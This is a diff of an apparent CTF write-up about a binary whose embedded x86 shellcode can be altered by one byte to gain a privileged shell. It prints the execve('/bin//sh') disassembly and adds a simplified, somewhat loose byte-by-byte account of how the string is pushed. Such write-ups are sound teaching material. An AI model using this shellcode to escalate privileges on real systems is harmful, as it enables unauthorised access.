@@ -12,21 +12,32 @@ printf(..);
 }
 ```
 
-If you analyzes binary file, you could figure out that we could modify 1 byte of shellcode, and we must leverage this vulnerability to obtain privileged shell.
+If you analyze binary file, you could figure out that we could modify 1 byte of shellcode, and we must leverage this vulnerability to obtain privileged shell.
 The shellcode is embedded in the binary and I have checked whether it is valid shellcode as below:
 
-xor    %eax,%eax  
-push   %eax  
-push   $0x68732f2f  
-push   $0x6e69622f  
-mov    %esp,%ebx  
-push   %eax  
-push   %ebx  
-mov    %esp,%ecx  
-mov    $0xb,%al  
-int    $0x80  
+> xor    %eax,%eax  
+> push   %eax  
+> push   $0x68732f2f  
+> push   $0x6e69622f  
+> mov    %esp,%ebx  
+> push   %eax  
+> push   %ebx  
+> mov    %esp,%ecx  
+> mov    $0xb,%al  
+> int    $0x80  
 
 Indeed it is valud shellcoded.
+To briefly explain meaning of "push $0x68732f2f" and "push $0x6e69622f".
+This is very basic technique to create shellcode. It embed necessary strings in the exploit code as follow:
+
+push '/' ; same as push 0x2f  
+push 'b' ; same as push 0x62  
+push 'i' ; same as push 0x69  
+push 'n' ; same as push 0x6e  
+push '/' ; same as push 0x2f  
+push '/' ; same as push 0x2f  
+push 's' ; same as push 0x73  
+push 'h' ; same as push 0x68  
 
 ## Headings
 
